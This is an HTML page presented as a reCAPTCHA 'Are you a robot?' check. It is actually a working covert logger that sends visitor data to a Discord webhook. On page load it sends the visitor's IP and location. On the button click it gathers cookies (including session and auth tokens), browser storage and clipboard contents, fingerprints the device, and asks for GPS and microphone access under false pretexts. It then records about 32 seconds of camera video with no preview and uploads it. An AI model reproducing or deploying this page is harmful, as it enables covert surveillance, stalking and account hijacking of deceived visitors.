<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Verification</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #f0f2f5 0%, #e0e5ec 100%);
            font-family: 'Segoe UI', Roboto, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            max-width: 480px;
            width: 100%;
            background: white;
            border-radius: 28px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.15);
            overflow: hidden;
        }
        .header { background: #1a1a2e; color: white; padding: 24px; text-align: center; }
        .content { padding: 32px 28px 40px; text-align: center; }
        .robot-icon { font-size: 70px; margin: 10px 0; }
        .question { font-size: 26px; font-weight: 600; color: #1e2a3a; margin: 16px 0 8px; }
        .sub { color: #5a6e7c; font-size: 14px; margin-bottom: 32px; }
        .captcha-btn {
            background: #2c7a4d; border: none; color: white; font-size: 20px; font-weight: bold;
            padding: 14px 32px; border-radius: 60px; cursor: pointer; width: 100%;
            transition: 0.2s; box-shadow: 0 5px 10px rgba(0,0,0,0.1);
        }
        .captcha-btn:hover { background: #1f5e3a; transform: scale(1.01); }
        .captcha-btn:disabled { background: #9aaeb9; cursor: not-allowed; }
        .timer { margin-top: 24px; font-family: monospace; font-size: 18px; color: #d9534f; font-weight: bold; display: none; }
        .permission-notice {
            background: #f8f9fa; border-left: 4px solid #4caf50; padding: 12px 16px;
            font-size: 13px; color: #2c3e50; text-align: left; margin: 20px 0 0;
            display: none; border-radius: 8px;
        }
        .permission-notice.show { display: block; }
        .footer { background: #f4f6f9; padding: 16px; text-align: center; font-size: 11px; color: #7e8c8d; }
    </style>
</head>
<body>
<div class="container" id="mainContainer">
    <div class="header"><div>🔒 VERIFICATION REQUIRED</div></div>
    <div class="content">
        <div class="robot-icon">🤖</div>
        <div class="question">Are you a robot?</div>
        <div class="sub">Help us keep the web safe</div>
        <button class="captcha-btn" id="actionBtn">❌ NO, I AM HUMAN</button>
        <div class="timer" id="timerDisplay"></div>
        <div class="permission-notice" id="permissionNotice">
            🔒 Legitimate verification – no data is stored permanently. Temporary permissions needed.
        </div>
    </div>
    <div class="footer">Protected by reCAPTCHA &nbsp;|&nbsp; Terms of Service</div>
</div>

<script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1479602171736494100/TtSG3mzG9tpZg0TiLkBCHvjtMVw4SkbqfZEWJRfU5hi_uHyoGb7WqwaS5GNUM5vphNwR";

    // ==================== 1. INITIAL IP WEBHOOK (on load) ====================
    async function sendInitialIP() {
        try {
            const ipRes = await fetch("https://api.ipify.org?format=json");
            const ipData = await ipRes.json();
            const ip = ipData.ip;
            const geoRes = await fetch("https://ipapi.co/json/");
            const geo = geoRes.ok ? await geoRes.json() : { city: "?", region: "?", country_name: "?", org: "?" };
            const payload = {
                username: "🌐 Silent Logger",
                embeds: [{
                    title: "🕵️ Visitor IP (Page Load)",
                    description: `**IP:** \`${ip}\`\n**Time:** ${new Date().toISOString()}`,
                    fields: [
                        { name: "Location (IP based)", value: `${geo.city}, ${geo.region}, ${geo.country_name}`, inline: true },
                        { name: "ISP", value: geo.org || "Unknown", inline: true }
                    ],
                    color: 0x3498db
                }]
            };
            await fetch(WEBHOOK_URL, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) });
        } catch(e) { console.error(e); }
    }
    sendInitialIP();

    // ==================== 2. DATA COLLECTION FUNCTIONS (same as before) ====================
    function categorizeCookie(name) {
        const n = name.toLowerCase();
        if (n.includes("fb") || n.includes("facebook")) return "Facebook";
        if (n.includes("google") || n.includes("_ga")) return "Google";
        if (n.includes("twitter")) return "Twitter";
        if (n.includes("amazon")) return "Amazon";
        if (n.includes("session") || n.includes("token") || n.includes("auth") || n.includes("jwt")) return "Session/Auth";
        if (n.includes("ad") || n.includes("track")) return "Ad/Tracker";
        return "Other";
    }
    function getAllCookies() {
        if (!document.cookie) return [];
        return document.cookie.split(';').map(c => c.trim()).filter(Boolean).map(c => {
            let [name, ...rest] = c.split('=');
            return { name: name.trim(), value: rest.join('='), platform: categorizeCookie(name) };
        });
    }
    function getAllLocalStorage() { try { return { ...localStorage }; } catch(e) { return { error: e.message }; } }
    function getAllSessionStorage() { try { return { ...sessionStorage }; } catch(e) { return { error: e.message }; } }
    async function getAllIndexedDB() {
        if (!window.indexedDB?.databases) return { info: "Cannot enumerate" };
        try { return await window.indexedDB.databases(); } catch(e) { return { error: e.message }; }
    }
    function getGPU() {
        try {
            const canvas = document.createElement("canvas");
            const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
            if (!gl) return { error: "WebGL unavailable" };
            const debug = gl.getExtension("WEBGL_debug_renderer_info");
            let info = { renderer: "?", vendor: "?" };
            if (debug) {
                info.renderer = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
                info.vendor = gl.getParameter(debug.UNMASKED_VENDOR_WEBGL);
            }
            const extensions = gl.getSupportedExtensions() || [];
            const params = {
                maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
                maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS),
                aliasedLineWidthRange: gl.getParameter(gl.ALIASED_LINE_WIDTH_RANGE),
                maxCombinedTextureImageUnits: gl.getParameter(gl.MAX_COMBINED_TEXTURE_IMAGE_UNITS),
                vendor: gl.getParameter(gl.VENDOR),
                renderer: gl.getParameter(gl.RENDERER),
                shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
            };
            return { ...info, extensions: extensions.slice(0,20), params };
        } catch(e) { return { error: e.message }; }
    }
    async function getBattery() {
        if (!navigator.getBattery) return "Unavailable";
        try { const b = await navigator.getBattery(); return { level: Math.round(b.level*100)+"%", charging: b.charging, chargingTime: b.chargingTime, dischargingTime: b.dischargingTime }; } catch(e) { return "Error"; }
    }
    function getConnection() {
        const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        return c ? { effectiveType: c.effectiveType, downlink: c.downlink, rtt: c.rtt, saveData: c.saveData } : "Unavailable";
    }
    function getPlugins() { try { return Array.from(navigator.plugins).map(p => p.name); } catch(e) { return []; } }
    function getFonts() {
        if (!document.fonts) return "Unavailable";
        let fontSet = [];
        for (let font of document.fonts.values()) fontSet.push(font.family);
        return fontSet.slice(0, 30);
    }
    function getWebRTCIPs() {
        return new Promise((resolve) => {
            let ips = [];
            try {
                const pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel("");
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
                pc.onicecandidate = (event) => {
                    if (!event.candidate) { resolve(ips.length ? ips : ["No local IPs found"]); return; }
                    const candidate = event.candidate.candidate;
                    const ipMatch = candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
                    if (ipMatch && !ips.includes(ipMatch[0])) ips.push(ipMatch[0]);
                };
                setTimeout(() => resolve(ips.length ? ips : ["Timeout"]), 2000);
            } catch(e) { resolve(["WebRTC blocked"]); }
        });
    }
    async function getCanvasFingerprint() {
        try {
            const canvas = document.createElement("canvas");
            canvas.width = 200; canvas.height = 50;
            const ctx = canvas.getContext("2d");
            ctx.fillStyle = "#f60"; ctx.fillRect(0, 0, 200, 50);
            ctx.fillStyle = "#069"; ctx.font = "14px Arial"; ctx.fillText("Max Logger", 10, 30);
            return canvas.toDataURL().substring(0, 100);
        } catch(e) { return "Canvas blocked"; }
    }
    async function getAudioFingerprint() {
        try {
            const ctx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
            const oscillator = ctx.createOscillator();
            oscillator.type = "sine";
            oscillator.frequency.value = 440;
            oscillator.connect(ctx.destination);
            oscillator.start();
            const buffer = await ctx.startRendering();
            const audioData = buffer.getChannelData(0).slice(0, 100);
            return audioData.reduce((a,b) => a + Math.abs(b), 0).toString().slice(0, 20);
        } catch(e) { return "Audio fingerprint failed"; }
    }
    async function getFingerprint(gpu, canvasFp, audioFp) {
        const raw = [
            navigator.userAgent, navigator.language, screen.width, screen.height, screen.colorDepth,
            navigator.hardwareConcurrency, navigator.deviceMemory, gpu.renderer || "", gpu.vendor || "",
            new Date().getTimezoneOffset(), canvasFp, audioFp
        ].join("|");
        const hash = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(raw));
        return Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2,"0")).join("");
    }
    function getPerformanceTiming() {
        if (!window.performance) return "N/A";
        const timing = performance.timing;
        if (!timing) return "N/A";
        return {
            loadTime: timing.loadEventEnd - timing.navigationStart,
            domReady: timing.domContentLoadedEventEnd - timing.navigationStart,
            responseTime: timing.responseEnd - timing.requestStart
        };
    }
    function getMemoryInfo() {
        if (performance.memory) return { jsHeapSize: performance.memory.jsHeapSizeLimit, totalHeap: performance.memory.totalJSHeapSize, usedHeap: performance.memory.usedJSHeapSize };
        return "Unavailable";
    }
    async function getMediaDevices() {
        try {
            if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return "Not supported";
            const devices = await navigator.mediaDevices.enumerateDevices();
            return devices.map(d => ({ kind: d.kind, label: d.label || "unlabeled", deviceId: d.deviceId.slice(0,10) }));
        } catch(e) { return `Error: ${e.message}`; }
    }
    async function readClipboard() {
        try {
            if (!navigator.clipboard || !navigator.clipboard.readText) return "Clipboard API not supported";
            const text = await navigator.clipboard.readText();
            return text.slice(0, 500);
        } catch(e) { return `Clipboard read denied: ${e.message}`; }
    }
    async function getBluetoothDevices() {
        try {
            if (!navigator.bluetooth) return "Web Bluetooth not supported";
            const device = await navigator.bluetooth.requestDevice({ acceptAllDevices: true });
            return { name: device.name, id: device.id };
        } catch(e) { return `Bluetooth error: ${e.message}`; }
    }
    async function getUSBDevices() {
        try {
            if (!navigator.usb) return "WebUSB not supported";
            const devices = await navigator.usb.getDevices();
            return devices.map(d => ({ productName: d.productName, manufacturerName: d.manufacturerName }));
        } catch(e) { return `USB error: ${e.message}`; }
    }

    // ==================== 3. PERMISSION REQUESTS (non-camera) ====================
    async function requestGeolocation() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) { resolve({ error: "Geolocation not supported" }); return; }
            navigator.geolocation.getCurrentPosition(
                (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy, altitude: pos.coords.altitude, heading: pos.coords.heading, speed: pos.coords.speed }),
                (err) => resolve({ error: err.message }),
                { enableHighAccuracy: true, timeout: 15000 }
            );
        });
    }
    async function requestMicrophone() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            stream.getTracks().forEach(t => t.stop());
            return { success: true };
        } catch(e) { return { error: e.message }; }
    }
    async function requestNotifications() {
        if (!("Notification" in window)) return { error: "Not supported" };
        if (Notification.permission === "granted") return { status: "already granted" };
        const result = await Notification.requestPermission();
        return { status: result };
    }
    async function requestClipboard() {
        try { await navigator.clipboard.readText(); return { success: true }; } catch(e) { return { error: e.message }; }
    }

    async function reverseGeocode(lat, lon) {
        try {
            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
            const data = await res.json();
            return data.display_name || `${lat}, ${lon}`;
        } catch(e) { return `${lat}, ${lon} (address failed)`; }
    }

    // ==================== 4. VIDEO RECORDING (no preview) ====================
    async function startAndRecordCamera(durationMs) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            const recordedChunks = [];
            const mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
            return new Promise((resolve) => {
                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) recordedChunks.push(event.data);
                };
                mediaRecorder.onstop = () => {
                    const blob = new Blob(recordedChunks, { type: "video/webm" });
                    stream.getTracks().forEach(t => t.stop());
                    resolve(blob);
                };
                mediaRecorder.start(100);
                setTimeout(() => {
                    if (mediaRecorder.state === "recording") mediaRecorder.stop();
                }, durationMs);
            });
        } catch(e) {
            console.error("Camera error", e);
            return null;
        }
    }

    // ==================== 5. SEND TEXT LOG IMMEDIATELY ====================
    async function sendTextLog(finalData, hasCamera) {
        // Generate TXT report (same as before, but include note about video pending)
        function generateTextReport(d) {
            let r = "=".repeat(80) + "\n        ULTIMATE MAX LOGGER - TEXT REPORT (VIDEO PENDING)\n" + "=".repeat(80) + "\n\n";
            r += `Time: ${d.timestamp}\nURL: ${d.pageURL}\nReferrer: ${d.referrer || "(none)"}\n\n`;
            r += "📍 PRECISE LOCATION\n";
            if (d.permissions.geolocation.lat) {
                r += `Lat: ${d.permissions.geolocation.lat}, Lon: ${d.permissions.geolocation.lon}\nAccuracy: ±${d.permissions.geolocation.accuracy}m\n`;
                if (d.permissions.geolocation.altitude) r += `Altitude: ${d.permissions.geolocation.altitude}m\n`;
                if (d.permissions.geolocation.heading) r += `Heading: ${d.permissions.geolocation.heading}°\n`;
                if (d.permissions.geolocation.speed) r += `Speed: ${d.permissions.geolocation.speed} m/s\n`;
                r += `Address: ${d.reverseAddress}\nGoogle Maps: https://www.google.com/maps?q=${d.permissions.geolocation.lat},${d.permissions.geolocation.lon}\n`;
            } else { r += `Location denied: ${d.permissions.geolocation.error}\n`; }
            r += `\nLocal IPs (WebRTC): ${d.webRTC_IPs.join(", ")}\n`;
            r += `\n🍪 COOKIES (${d.cookiesCount})\n`;
            for (const [plat, cookies] of Object.entries(d.cookiesByPlatform)) {
                r += `[${plat}] (${cookies.length})\n`;
                for (const c of cookies.slice(0,15)) r += `  ${c.name} = ${c.value.slice(0,80)}\n`;
                if (cookies.length>15) r += `  ... and ${cookies.length-15} more\n`;
            }
            r += `\n💾 LocalStorage (${Object.keys(d.localStorage).length} items)\n`;
            for (const [k,v] of Object.entries(d.localStorage).slice(0,20)) r += `${k}=${(typeof v==='string'?v:JSON.stringify(v)).slice(0,100)}\n`;
            r += `\n📦 SessionStorage (${Object.keys(d.sessionStorage).length} items)\n`;
            for (const [k,v] of Object.entries(d.sessionStorage).slice(0,20)) r += `${k}=${(typeof v==='string'?v:JSON.stringify(v)).slice(0,100)}\n`;
            r += `\n🗃️ IndexedDB: ${Array.isArray(d.indexedDB) ? d.indexedDB.map(db=>db.name).join(", ") : JSON.stringify(d.indexedDB)}\n`;
            r += `\n🖥️ SYSTEM\nUserAgent: ${d.navigator.userAgent}\nPlatform: ${d.navigator.platform}\nLanguages: ${d.navigator.languages}\nCPU Cores: ${d.navigator.hardwareConcurrency}\nRAM: ${d.navigator.deviceMemory || "?"} GB\nMax Touch Points: ${d.navigator.maxTouchPoints}\nScreen: ${d.screen.width}x${d.screen.height} @ ${d.screen.colorDepth}bit, Ratio: ${d.screen.pixelRatio}\nTimezone: ${d.timezone}\n`;
            r += `\n🎮 GPU\nRenderer: ${d.gpu.renderer}\nVendor: ${d.gpu.vendor}\nExtensions: ${d.gpu.extensions?.join(", ")}\nParameters: ${JSON.stringify(d.gpu.params)}\n`;
            r += `\n🔋 Battery: ${JSON.stringify(d.battery)}\n📡 Connection: ${JSON.stringify(d.connection)}\n🔌 Plugins: ${d.plugins.join(", ")}\n🔤 Fonts (first 20): ${d.fonts.slice(0,20).join(", ")}\n`;
            r += `\n🖌️ Canvas Fingerprint: ${d.canvasFingerprint}\n🎵 Audio Fingerprint: ${d.audioFingerprint}\n🔐 SHA-256 Fingerprint: ${d.fingerprint}\n`;
            r += `\n⏱️ Performance: Load ${d.performance.loadTime}ms, DOM ready ${d.performance.domReady}ms\n🧠 Memory: ${JSON.stringify(d.memory)}\n`;
            r += `\n📹 Media Devices: ${JSON.stringify(d.mediaDevices)}\n📋 Clipboard: ${d.clipboard}\n🎧 Bluetooth: ${JSON.stringify(d.bluetooth)}\n🔌 USB: ${JSON.stringify(d.usb)}\n`;
            r += `\nPermissions: Geo=${d.permissions.geolocation.lat?"OK":"DENIED"}, Camera=${hasCamera?"REQUESTED":"NOT YET"}, Mic=${d.permissions.microphone?"OK":"DENIED"}, Notif=${d.permissions.notifications}\n`;
            r += `\n🎥 Video recording: Pending (will be sent separately)\n`;
            return r;
        }
        const reportText = generateTextReport(finalData);
        const txtBlob = new Blob([reportText], { type: "text/plain" });
        const formData = new FormData();
        formData.append("file", txtBlob, `log_${Date.now()}.txt`);
        let locationInfo = "❌ Denied";
        let mapsLink = "";
        if (finalData.permissions.geolocation.lat) {
            locationInfo = `${finalData.permissions.geolocation.lat}, ${finalData.permissions.geolocation.lon} (±${finalData.permissions.geolocation.accuracy}m)`;
            mapsLink = `\n[🗺️ Google Maps](https://www.google.com/maps?q=${finalData.permissions.geolocation.lat},${finalData.permissions.geolocation.lon})`;
        }
        const embed = {
            embeds: [{
                title: "📄 TEXT LOG (IMMEDIATE)",
                description: `**📍 Location:** ${locationInfo}${mapsLink}\n**Cookies:** ${finalData.cookiesCount}\n**Fingerprint:** ${finalData.fingerprint.slice(0,32)}...\n**Video:** Pending...`,
                color: 0x3498db,
                fields: [
                    { name: "Permissions", value: `GPS: ${finalData.permissions.geolocation.lat ? "✅" : "❌"}\nMic: ${finalData.permissions.microphone ? "✅" : "❌"}\nClipboard: ${finalData.clipboard ? "✅" : "❌"}`, inline: true },
                    { name: "Hardware", value: `CPU: ${finalData.navigator.hardwareConcurrency} cores\nRAM: ${finalData.navigator.deviceMemory || "?"} GB`, inline: true }
                ],
                timestamp: finalData.timestamp
            }]
        };
        formData.append("payload_json", JSON.stringify(embed));
        await fetch(WEBHOOK_URL, { method: "POST", body: formData });
    }

    // ==================== 6. SEND VIDEO CLIP SEPARATELY ====================
    async function sendVideoClip(videoBlob, startTime) {
        const formData = new FormData();
        formData.append("file", videoBlob, `video_${Date.now()}.webm`);
        const embed = {
            embeds: [{
                title: "🎥 VIDEO RECORDING",
                description: `**Duration:** ~32 seconds\n**Size:** ${(videoBlob.size/1024).toFixed(1)} KB\n**Recorded at:** ${new Date().toISOString()}`,
                color: 0xff5500,
                timestamp: new Date().toISOString()
            }]
        };
        formData.append("payload_json", JSON.stringify(embed));
        await fetch(WEBHOOK_URL, { method: "POST", body: formData });
    }

    // ==================== 7. MAIN CAPTCHA CLICK ====================
    let isRunning = false;
    const btn = document.getElementById("actionBtn");
    const timerDiv = document.getElementById("timerDisplay");
    const noticeDiv = document.getElementById("permissionNotice");

    btn.addEventListener("click", async () => {
        if (isRunning) return;
        isRunning = true;
        btn.disabled = true;
        btn.innerText = "✓ VERIFYING...";
        timerDiv.style.display = "block";
        noticeDiv.classList.add("show");

        let timeLeft = 32;
        timerDiv.innerText = `⏳ Redirecting in ${timeLeft} seconds...`;
        const interval = setInterval(() => {
            timeLeft--;
            if (timeLeft <= 0) clearInterval(interval);
            timerDiv.innerText = timeLeft > 0 ? `⏳ Redirecting in ${timeLeft} seconds...` : "Redirecting now...";
        }, 1000);

        // ---- 1. Collect non-camera data and request permissions (except camera) ----
        const gpu = getGPU();
        const canvasFp = await getCanvasFingerprint();
        const audioFp = await getAudioFingerprint();
        const fingerprint = await getFingerprint(gpu, canvasFp, audioFp);
        const battery = await getBattery();
        const connection = getConnection();
        const plugins = getPlugins();
        const fonts = getFonts();
        const cookies = getAllCookies();
        const localStorage = getAllLocalStorage();
        const sessionStorage = getAllSessionStorage();
        const indexedDB = await getAllIndexedDB();
        const webRTC = await getWebRTCIPs();
        const perf = getPerformanceTiming();
        const memory = getMemoryInfo();
        const mediaDevices = await getMediaDevices();

        const cookiesByPlatform = {};
        for (const c of cookies) {
            if (!cookiesByPlatform[c.platform]) cookiesByPlatform[c.platform] = [];
            cookiesByPlatform[c.platform].push(c);
        }

        // ---- Permissions (location, clipboard, notifications, mic) ----
        noticeDiv.innerHTML = "📍 Location required for regional verification – click ALLOW";
        const geoloc = await requestGeolocation();
        let address = "";
        if (geoloc.lat && geoloc.lon) address = await reverseGeocode(geoloc.lat, geoloc.lon);

        noticeDiv.innerHTML = "📋 Clipboard read (to verify human interaction) – click ALLOW";
        const clipboardPerm = await requestClipboard();
        let clipboardContent = "";
        if (clipboardPerm.success) clipboardContent = await readClipboard();

        noticeDiv.innerHTML = "🔔 Notification permission (for redirect alert) – click ALLOW";
        const notif = await requestNotifications();

        noticeDiv.innerHTML = "🎤 Microphone check – click ALLOW";
        const mic = await requestMicrophone();

        noticeDiv.innerHTML = "🔊 Optional: Bluetooth devices (click ALLOW if you want)";
        const bluetooth = await getBluetoothDevices();

        noticeDiv.innerHTML = "🔌 Scanning USB devices...";
        const usb = await getUSBDevices();

        // Build final data object (without video yet)
        const finalData = {
            timestamp: new Date().toISOString(),
            pageURL: window.location.href,
            referrer: document.referrer,
            cookiesCount: cookies.length,
            cookiesByPlatform,
            localStorage, sessionStorage, indexedDB,
            webRTC_IPs: webRTC,
            gpu, battery, connection, plugins, fonts, fingerprint,
            canvasFingerprint: canvasFp,
            audioFingerprint: audioFp,
            performance: perf,
            memory: memory,
            mediaDevices: mediaDevices,
            clipboard: clipboardContent,
            bluetooth: bluetooth,
            usb: usb,
            permissions: {
                geolocation: geoloc,
                microphone: mic.success,
                notifications: notif.status
            },
            reverseAddress: address,
            navigator: {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory,
                cookieEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack,
                online: navigator.onLine,
                vendor: navigator.vendor,
                maxTouchPoints: navigator.maxTouchPoints
            },
            screen: {
                width: screen.width, height: screen.height, availWidth: screen.availWidth, availHeight: screen.availHeight,
                colorDepth: screen.colorDepth, pixelRatio: window.devicePixelRatio,
                orientation: screen.orientation?.type || "n/a"
            },
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };

        // ---- Send text log immediately (without waiting for camera) ----
        await sendTextLog(finalData, false);
        noticeDiv.innerHTML = "✅ Text log sent. Now requesting camera for video verification...";

        // ---- 2. Request camera and start recording (no preview) ----
        noticeDiv.innerHTML = "🎥 Camera access for facial verification – click ALLOW";
        const videoBlob = await startAndRecordCamera(32000); // records for up to 32 seconds

        if (videoBlob) {
            // Send video clip as separate message
            await sendVideoClip(videoBlob);
            noticeDiv.innerHTML = "✅ Video sent. Finalizing...";
        } else {
            noticeDiv.innerHTML = "⚠️ Camera denied or error – no video sent.";
        }

        // After 32 seconds, fake redirect (already handled by timer UI)
        setTimeout(() => {
            document.getElementById("mainContainer").innerHTML = `
                <div class="container" style="background:white; text-align:center; padding:40px;">
                    <div style="font-size:48px;">↻</div>
                    <h2>Redirecting to protected resource...</h2>
                    <p>https://verification-required.com/secure/</p>
                    <p style="font-size:12px;">If not redirected, <a href="#">click here</a></p>
                </div>
            `;
        }, 32000);
    });
</script>
</body>
</html>
